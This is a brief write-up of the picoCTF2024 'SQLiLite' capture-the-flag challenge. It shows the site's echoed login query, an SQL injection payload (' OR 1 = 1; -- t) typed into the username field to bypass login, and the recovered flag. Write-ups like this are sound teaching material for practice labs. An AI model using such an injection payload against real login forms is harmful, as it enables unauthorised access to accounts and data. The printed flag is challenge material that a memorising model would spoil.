# picoCTF2024 SQLiLite Write Up

## Description

> Can you login to this website? Try to login [here](http://saturn.picoctf.net:57639/).

## Solution

The challenge website features a standard login page. Entering the default credentials reveals the following details about the login attempt:

```
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```

This tells us that the users username and password are begin used to fetch data from an SQL database. We can easily manipulate this query to fetch all users by setting the username to:

```
' OR 1 = 1; -- t
```

And using any password. This results in a successful login, however we are then the flag is "hidden in plainsight". Checking the pages source code reveals the flag:

```
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
```

